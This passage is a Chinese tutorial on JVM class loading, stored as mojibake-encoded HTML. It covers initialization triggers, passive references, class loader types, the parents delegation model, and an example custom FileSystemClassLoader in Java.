å½“åˆå§‹åŒ–ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°å…¶çˆ¶ç±»è¿˜æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶çˆ¶ç±»çš„åˆå§‹åŒ–ã€‚<br/> </li><li> å½“è™šæ‹Ÿæœºå¯åŠ¨æ—¶ï¼Œç”¨æˆ·éœ€è¦æŒ‡å®šä¸€ä¸ªè¦æ‰§è¡Œçš„ä¸»ç±»ï¼ˆåŒ…å« main() æ–¹æ³•çš„é‚£ä¸ªç±»ï¼‰ï¼Œè™šæ‹Ÿæœºä¼šå…ˆåˆå§‹åŒ–è¿™ä¸ªä¸»ç±»ï¼›<br/> </li><li> å½“ä½¿ç”¨ JDK 1.7 çš„åŠ¨æ€è¯­è¨€æ”¯æŒæ—¶ï¼Œå¦‚æœä¸€ä¸ª java.lang.invoke.MethodHandle å®ä¾‹æœ€åçš„è§£æç»“æœä¸º REF_getStatic, REF_putStatic, REF_invokeStatic çš„æ–¹æ³•å¥æŸ„ï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•å¥æŸ„æ‰€å¯¹åº”çš„ç±»æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶åˆå§‹åŒ–ï¼›<br/> </li></ul><h3>2. è¢«åŠ¨å¼•ç”¨</h3><p>ä»¥ä¸Š 5 ç§åœºæ™¯ä¸­çš„è¡Œä¸ºç§°ä¸ºå¯¹ä¸€ä¸ªç±»è¿›è¡Œä¸»åŠ¨å¼•ç”¨ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ‰€æœ‰å¼•ç”¨ç±»çš„æ–¹å¼éƒ½ä¸ä¼šè§¦å‘åˆå§‹åŒ–ï¼Œç§°ä¸ºè¢«åŠ¨å¼•ç”¨ã€‚è¢«åŠ¨å¼•ç”¨çš„å¸¸è§ä¾‹å­åŒ…æ‹¬ï¼š</p><ul><li>é€šè¿‡å­ç±»å¼•ç”¨çˆ¶ç±»çš„é™æ€å­—æ®µï¼Œä¸ä¼šå¯¼è‡´å­ç±»åˆå§‹åŒ–ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">SubClass</span><span class=\"o\">.</span><span class=\"na\">value</span><span class=\"o\">);</span>  <span class=\"o\">//</span> <span class=\"n\">value</span> <span class=\"n\">å­—æ®µåœ¨</span> <span class=\"n\">SuperClass</span> <span class=\"n\">ä¸­å®šä¹‰</span></code></pre></div><ul><li>é€šè¿‡æ•°ç»„å®šä¹‰æ¥å¼•ç”¨ç±»ï¼Œä¸ä¼šè§¦å‘æ­¤ç±»çš„åˆå§‹åŒ–ã€‚è¯¥è¿‡ç¨‹ä¼šå¯¹æ•°ç»„ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œæ•°ç»„ç±»æ˜¯ä¸€ä¸ªç”±è™šæ‹Ÿæœºè‡ªåŠ¨ç”Ÿæˆçš„ã€ç›´æ¥ç»§æ‰¿è‡ª Object çš„å­ç±»ï¼Œå…¶ä¸­åŒ…å«äº†æ•°ç»„çš„å±æ€§å’Œæ–¹æ³•ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">SuperClass</span><span class=\"o\">[]</span> <span class=\"n\">sca</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">SuperClass</span><span class=\"o\">[</span><span class=\"n\">10</span><span class=\"o\">];</span></code></pre></div><ul><li>å¸¸é‡åœ¨ç¼–è¯‘é˜¶æ®µä¼šå­˜å…¥è°ƒç”¨ç±»çš„å¸¸é‡æ± ä¸­ï¼Œæœ¬è´¨ä¸Šå¹¶æ²¡æœ‰ç›´æ¥å¼•ç”¨åˆ°å®šä¹‰å¸¸é‡çš„ç±»ï¼Œå› æ­¤ä¸ä¼šè§¦å‘å®šä¹‰å¸¸é‡çš„ç±»çš„åˆå§‹åŒ–ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">ConstClass</span><span class=\"o\">.</span><span class=\"na\">HELLOWORLD</span><span class=\"o\">);</span></code></pre></div><h2>ç±»ä¸ç±»åŠ è½½å™¨</h2><p>ä¸¤ä¸ªç±»ç›¸ç­‰ï¼Œéœ€è¦ç±»æœ¬èº«ç›¸ç­‰ï¼Œå¹¶ä¸”ä½¿ç”¨åŒä¸€ä¸ªç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ã€‚è¿™æ˜¯å› ä¸ºæ¯ä¸€ä¸ªç±»åŠ è½½å™¨éƒ½æ‹¥æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ç±»åç§°ç©ºé—´ã€‚</p><p>è¿™é‡Œçš„ç›¸ç­‰ï¼ŒåŒ…æ‹¬ç±»çš„ Class å¯¹è±¡çš„ equals() æ–¹æ³•ã€isAssignableFrom() æ–¹æ³•ã€isInstance() æ–¹æ³•çš„è¿”å›ç»“æœä¸º trueï¼Œä¹ŸåŒ…æ‹¬ä½¿ç”¨ instanceof å…³é”®å­—åšå¯¹è±¡æ‰€å±å…³ç³»åˆ¤å®šç»“æœä¸º trueã€‚</p><h2>ç±»åŠ è½½å™¨åˆ†ç±»</h2><p>ä» Java è™šæ‹Ÿæœºçš„è§’åº¦æ¥è®²ï¼Œåªå­˜åœ¨ä»¥ä¸‹ä¸¤ç§ä¸åŒçš„ç±»åŠ è½½å™¨ï¼š</p><ul><li> å¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆBootstrap ClassLoaderï¼‰ï¼Œä½¿ç”¨ C++ å®ç°ï¼Œæ˜¯è™šæ‹Ÿæœºè‡ªèº«çš„ä¸€éƒ¨åˆ†ï¼›<br/> </li><li> æ‰€æœ‰å…¶å®ƒç±»çš„åŠ è½½å™¨ï¼Œä½¿ç”¨ Java å®ç°ï¼Œç‹¬ç«‹äºè™šæ‹Ÿæœºï¼Œç»§æ‰¿è‡ªæŠ½è±¡ç±» java.lang.ClassLoaderã€‚<br/> </li></ul><p>ä» Java å¼€å‘äººå‘˜çš„è§’åº¦çœ‹ï¼Œç±»åŠ è½½å™¨å¯ä»¥åˆ’åˆ†å¾—æ›´ç»†è‡´ä¸€äº›ï¼š</p><ul><li> å¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆBootstrap ClassLoaderï¼‰æ­¤ç±»åŠ è½½å™¨è´Ÿè´£å°†å­˜æ”¾åœ¨ &lt;JRE_HOME&gt;\\lib ç›®å½•ä¸­çš„ï¼Œæˆ–è€…è¢« -Xbootclasspath å‚æ•°æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­çš„ï¼Œå¹¶ä¸”æ˜¯è™šæ‹Ÿæœºè¯†åˆ«çš„ï¼ˆä»…æŒ‰ç…§æ–‡ä»¶åè¯†åˆ«ï¼Œå¦‚ rt.jarï¼Œåå­—ä¸ç¬¦åˆçš„ç±»åº“å³ä½¿æ”¾åœ¨ lib ç›®å½•ä¸­ä¹Ÿä¸ä¼šè¢«åŠ è½½ï¼‰ç±»åº“åŠ è½½åˆ°è™šæ‹Ÿæœºå†…å­˜ä¸­ã€‚å¯åŠ¨ç±»åŠ è½½å™¨æ— æ³•è¢« Java ç¨‹åºç›´æ¥å¼•ç”¨ï¼Œç”¨æˆ·åœ¨ç¼–å†™è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ—¶ï¼Œå¦‚æœéœ€è¦æŠŠåŠ è½½è¯·æ±‚å§”æ´¾ç»™å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œç›´æ¥ä½¿ç”¨ null ä»£æ›¿å³å¯ã€‚<br/> </li><li> æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtension ClassLoaderï¼‰è¿™ä¸ªç±»åŠ è½½å™¨æ˜¯ç”± ExtClassLoaderï¼ˆsun.misc.Launcher$ExtClassLoaderï¼‰å®ç°çš„ã€‚å®ƒè´Ÿè´£å°† &lt;JAVA_HOME&gt;/lib/ext æˆ–è€…è¢« java.ext.dir ç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šè·¯å¾„ä¸­çš„æ‰€æœ‰ç±»åº“åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨æ‰©å±•ç±»åŠ è½½å™¨ã€‚<br/> </li><li> åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ï¼ˆApplication ClassLoaderï¼‰è¿™ä¸ªç±»åŠ è½½å™¨æ˜¯ç”± AppClassLoaderï¼ˆsun.misc.Launcher$AppClassLoaderï¼‰å®ç°çš„ã€‚ç”±äºè¿™ä¸ªç±»åŠ è½½å™¨æ˜¯ ClassLoader ä¸­çš„ getSystemClassLoader() æ–¹æ³•çš„è¿”å›å€¼ï¼Œå› æ­¤ä¸€èˆ¬ç§°ä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ã€‚å®ƒè´Ÿè´£åŠ è½½ç”¨æˆ·ç±»è·¯å¾„ï¼ˆClassPathï¼‰ä¸Šæ‰€æŒ‡å®šçš„ç±»åº“ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªç±»åŠ è½½å™¨ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä¸­æ²¡æœ‰è‡ªå®šä¹‰è¿‡è‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¸ªå°±æ˜¯ç¨‹åºä¸­é»˜è®¤çš„ç±»åŠ è½½å™¨ã€‚<br/> </li></ul><p class=\"ztext-empty-paragraph\"><br/></p><h2>åŒäº²å§”æ´¾æ¨¡å‹</h2><p>åº”ç”¨ç¨‹åºæ˜¯ç”±ä¸‰ç§ç±»åŠ è½½å™¨äº’ç›¸é…åˆä»è€Œå®ç°ç±»åŠ è½½ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥åŠ å…¥è‡ªå·±å®šä¹‰çš„ç±»åŠ è½½å™¨ã€‚</p><p>ä¸‹å›¾å±•ç¤ºäº†ç±»åŠ è½½å™¨ä¹‹é—´çš„å±‚æ¬¡å…³ç³»ï¼Œç§°ä¸ºåŒäº²å§”æ´¾æ¨¡å‹ï¼ˆParents Delegation Modelï¼‰ã€‚è¯¥æ¨¡å‹è¦æ±‚é™¤äº†é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨å¤–ï¼Œå…¶å®ƒçš„ç±»åŠ è½½å™¨éƒ½è¦æœ‰è‡ªå·±çš„çˆ¶ç±»åŠ è½½å™¨ã€‚è¿™é‡Œçš„çˆ¶å­å…³ç³»ä¸€èˆ¬é€šè¿‡ç»„åˆå…³ç³»ï¼ˆCompositionï¼‰æ¥å®ç°ï¼Œè€Œä¸æ˜¯ç»§æ‰¿å…³ç³»ï¼ˆInheritanceï¼‰ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-28349961f153dffda2cd3642e492b244_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"817\" data-rawheight=\"771\" class=\"origin_image zh-lightbox-thumb\" width=\"817\" data-original=\"https://pic1.zhimg.com/v2-28349961f153dffda2cd3642e492b244_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;817&#39; height=&#39;771&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"817\" data-rawheight=\"771\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"817\" data-original=\"https://pic1.zhimg.com/v2-28349961f153dffda2cd3642e492b244_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-28349961f153dffda2cd3642e492b244_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>1. å·¥ä½œè¿‡ç¨‹</h3><p>ä¸€ä¸ªç±»åŠ è½½å™¨é¦–å…ˆå°†ç±»åŠ è½½è¯·æ±‚è½¬å‘åˆ°çˆ¶ç±»åŠ è½½å™¨ï¼Œåªæœ‰å½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•å®Œæˆæ—¶æ‰å°è¯•è‡ªå·±åŠ è½½ã€‚</p><h3>2. å¥½å¤„</h3><p>ä½¿å¾— Java ç±»éšç€å®ƒçš„ç±»åŠ è½½å™¨ä¸€èµ·å…·æœ‰ä¸€ç§å¸¦æœ‰ä¼˜å…ˆçº§çš„å±‚æ¬¡å…³ç³»ï¼Œä»è€Œä½¿å¾—åŸºç¡€ç±»å¾—åˆ°ç»Ÿä¸€ã€‚</p><p>ä¾‹å¦‚ java.lang.Object å­˜æ”¾åœ¨ rt.jar ä¸­ï¼Œå¦‚æœç¼–å†™å¦å¤–ä¸€ä¸ª java.lang.Object å¹¶æ”¾åˆ° ClassPath ä¸­ï¼Œç¨‹åºå¯ä»¥ç¼–è¯‘é€šè¿‡ã€‚ç”±äºåŒäº²å§”æ´¾æ¨¡å‹çš„å­˜åœ¨ï¼Œæ‰€ä»¥åœ¨ rt.jar ä¸­çš„ Object æ¯”åœ¨ ClassPath ä¸­çš„ Object ä¼˜å…ˆçº§æ›´é«˜ï¼Œè¿™æ˜¯å› ä¸º rt.jar ä¸­çš„ Object ä½¿ç”¨çš„æ˜¯å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œè€Œ ClassPath ä¸­çš„ Object ä½¿ç”¨çš„æ˜¯åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ã€‚rt.jar ä¸­çš„ Object ä¼˜å…ˆçº§æ›´é«˜ï¼Œé‚£ä¹ˆç¨‹åºä¸­æ‰€æœ‰çš„ Object éƒ½æ˜¯è¿™ä¸ª Objectã€‚</p><h3>3. å®ç°</h3><p>ä»¥ä¸‹æ˜¯æŠ½è±¡ç±» java.lang.ClassLoader çš„ä»£ç ç‰‡æ®µï¼Œå…¶ä¸­çš„ loadClass() æ–¹æ³•è¿è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼šå…ˆæ£€æŸ¥ç±»æ˜¯å¦å·²ç»åŠ è½½è¿‡ï¼Œå¦‚æœæ²¡æœ‰åˆ™è®©çˆ¶ç±»åŠ è½½å™¨å»åŠ è½½ã€‚å½“çˆ¶ç±»åŠ è½½å™¨åŠ è½½å¤±è´¥æ—¶æŠ›å‡º ClassNotFoundExceptionï¼Œæ­¤æ—¶å°è¯•è‡ªå·±å»åŠ è½½ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">abstract</span> <span class=\"kd\">class</span> <span class=\"nc\">ClassLoader</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// The parent class loader for delegation\n</span><span class=\"c1\"></span>    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"n\">ClassLoader</span> <span class=\"n\">parent</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">Class</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">loadClass</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">ClassNotFoundException</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">loadClass</span><span class=\"o\">(</span><span class=\"n\">name</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">protected</span> <span class=\"n\">Class</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">loadClass</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">,</span> <span class=\"kt\">boolean</span> <span class=\"n\">resolve</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">ClassNotFoundException</span> <span class=\"o\">{</span>\n        <span class=\"kd\">synchronized</span> <span class=\"o\">(</span><span class=\"n\">getClassLoadingLock</span><span class=\"o\">(</span><span class=\"n\">name</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// First, check if the class has already been loaded\n</span><span class=\"c1\"></span>            <span class=\"n\">Class</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">findLoadedClass</span><span class=\"o\">(</span><span class=\"n\">name</span><span class=\"o\">);</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">c</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"k\">try</span> <span class=\"o\">{</span>\n                    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">parent</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                        <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">parent</span><span class=\"o\">.</span><span class=\"na\">loadClass</span><span class=\"o\">(</span><span class=\"n\">name</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">);</span>\n                    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n                        <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">findBootstrapClassOrNull</span><span class=\"o\">(</span><span class=\"n\">name</span><span class=\"o\">);</span>\n                    <span class=\"o\">}</span>\n                <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">ClassNotFoundException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"c1\">// ClassNotFoundException thrown if class not found\n</span><span class=\"c1\"></span>                    <span class=\"c1\">// from the non-null parent class loader\n</span><span class=\"c1\"></span>                <span class=\"o\">}</span>\n\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">c</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"c1\">// If still not found, then invoke findClass in order\n</span><span class=\"c1\"></span>                    <span class=\"c1\">// to find the class.\n</span><span class=\"c1\"></span>                    <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">findClass</span><span class=\"o\">(</span><span class=\"n\">name</span><span class=\"o\">);</span>\n                <span class=\"o\">}</span>\n            <span class=\"o\">}</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">resolve</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">resolveClass</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n            <span class=\"k\">return</span> <span class=\"n\">c</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">protected</span> <span class=\"n\">Class</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">findClass</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">ClassNotFoundException</span> <span class=\"o\">{</span>\n        <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"n\">ClassNotFoundException</span><span class=\"o\">(</span><span class=\"n\">name</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>è‡ªå®šä¹‰ç±»åŠ è½½å™¨å®ç°</h2><p>ä»¥ä¸‹ä»£ç ä¸­çš„ FileSystemClassLoader æ˜¯è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œç»§æ‰¿è‡ª java.lang.ClassLoaderï¼Œç”¨äºåŠ è½½æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ç±»ã€‚å®ƒé¦–å…ˆæ ¹æ®ç±»çš„å…¨ååœ¨æ–‡ä»¶ç³»ç»Ÿä¸ŠæŸ¥æ‰¾ç±»çš„å­—èŠ‚ä»£ç æ–‡ä»¶ï¼ˆ.class æ–‡ä»¶ï¼‰ï¼Œç„¶åè¯»å–è¯¥æ–‡ä»¶å†…å®¹ï¼Œæœ€åé€šè¿‡ defineClass() æ–¹æ³•æ¥æŠŠè¿™äº›å­—èŠ‚ä»£ç è½¬æ¢æˆ java.lang.Class ç±»çš„å®ä¾‹ã€‚</p><p>java.lang.ClassLoader çš„ loadClass() å®ç°äº†åŒäº²å§”æ´¾æ¨¡å‹çš„é€»è¾‘ï¼Œè‡ªå®šä¹‰ç±»åŠ è½½å™¨ä¸€èˆ¬ä¸å»é‡å†™å®ƒï¼Œä½†æ˜¯éœ€è¦é‡å†™ findClass() æ–¹æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">FileSystemClassLoader</span> <span class=\"kd\">extends</span> <span class=\"n\">ClassLoader</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"n\">String</span> <span class=\"n\">rootDir</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">FileSystemClassLoader</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">rootDir</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">rootDir</span> <span class=\"o\">=</span> <span class=\"n\">rootDir</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">protected</span> <span class=\"n\">Class</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">findClass</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">ClassNotFoundException</span> <span class=\"o\">{</span>\n        <span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"n\">classData</span> <span class=\"o\">=</span> <span class=\"n\">getClassData</span><span class=\"o\">(</span><span class=\"n\">name</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">classData</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"n\">ClassNotFoundException</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"k\">return</span> <span class=\"n\">defineClass</span><span class=\"o\">(</span><span class=\"n\">name</span><span class=\"o\">,</span> <span class=\"n\">classData</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">classData</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"nf\">getClassData</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">className</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">String</span> <span class=\"n\">path</span> <span class=\"o\">=</span> <span class=\"n\">classNameToPath</span><span class=\"o\">(</span><span class=\"n\">className</span><span class=\"o\">);</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"n\">InputStream</span> <span class=\"n\">ins</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">FileInputStream</span><span class=\"o\">(</span><span class=\"n\">path</span><span class=\"o\">);</span>\n            <span class=\"n\">ByteArrayOutputStream</span> <span class=\"n\">baos</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ByteArrayOutputStream</span><span class=\"o\">();</span>\n            <span class=\"kt\">int</span> <span class=\"n\">bufferSize</span> <span class=\"o\">=</span> <span class=\"n\">4096</span><span class=\"o\">;</span>\n            <span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"n\">buffer</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">byte</span><span class=\"o\">[</span><span class=\"n\">bufferSize</span><span class=\"o\">];</span>\n            <span class=\"kt\">int</span> <span class=\"n\">bytesNumRead</span><span class=\"o\">;</span>\n            <span class=\"k\">while</span> <span class=\"o\">((</span><span class=\"n\">bytesNumRead</span> <span class=\"o\">=</span> <span class=\"n\">ins</span><span class=\"o\">.</span><span class=\"na\">read</span><span class=\"o\">(</span><span class=\"n\">buffer</span><span class=\"o\">))</span> <span class=\"o\">!=</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">baos</span><span class=\"o\">.</span><span class=\"na\">write</span><span class=\"o\">(</span><span class=\"n\">buffer</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">bytesNumRead</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n            <span class=\"k\">return</span> <span class=\"n\">baos</span><span class=\"o\">.</span><span class=\"na\">toByteArray</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">IOException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"n\">String</span> <span class=\"nf\">classNameToPath</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">className</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">rootDir</span> <span class=\"o\">+</span> <span class=\"n\">File</span><span class=\"o\">.</span><span class=\"na\">separatorChar</span>\n                <span class=\"o\">+</span> <span class=\"n\">className</span><span class=\"o\">.</span><span class=\"na\">replace</span><span class=\"o\">(</span><span class=\"sc\">&#39;.&#39;</span><span class=\"o\">,</span> <span class=\"n\">File</span><span class=\"o\">.</span><span class=\"na\">separatorChar</span><span class=\"o\">)</span> <span class=\"o\">+</span> <span class=\"s\">&#34;.class&#34;</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>å‚è€ƒèµ„æ–™</h2><ul><li>å‘¨å¿—æ˜. æ·±å…¥ç†è§£ Java è™šæ‹Ÿæœº [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2011.</li><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/specs/jvms/se8/html/jvms-2.html%23jvms-2.5.4\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Chapter 2. The Structure of the Java Virtual Machine</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.slideshare.net/benewu/jvm-memory\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Jvm memory</a> <a href=\"https://link.zhihu.com/?target=http%3A//www.oracle.com/webfolder/technetwork/tutorials/obe/java/G1GettingStarted/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Getting Started with the G1 Garbage Collector</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//electrofriends.com/articles/jni/jni-part1-java-native-interface/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">JNI Part1: Java Native Interface Introduction and â€œHello Worldâ€ application</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//hackthejava.wordpress.com/2015/01/09/memory-architecture-by-jvmruntime-data-areas/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Memory Architecture Of JVM(Runtime Data Areas)</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.programcreek.com/2013/04/jvm-run-time-data-areas/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">JVM Run-Time Data Areas</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.drdobbs.com/architecture-and-design/android-on-x86-java-native-interface-and/240166271\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Android on x86: Java Native Interface and the Android Native Development Kit</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//crowhawk.github.io/2017/08/10/jvm_2/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥ç†è§£ JVM(2)â€”â€”GC ç®—æ³•ä¸å†…å­˜åˆ†é…ç­–ç•¥</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//crowhawk.github.io/2017/08/15/jvm_3/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥ç†è§£ JVM(3)â€”â€”7 ç§åƒåœ¾æ”¶é›†å™¨</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//blog.jamesdbloom.com/JVMInternals.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">JVM Internals</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/java/j-lo-classloader/index.html%23code6\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥æ¢è®¨ Java ç±»åŠ è½½å™¨</a></li><li><a 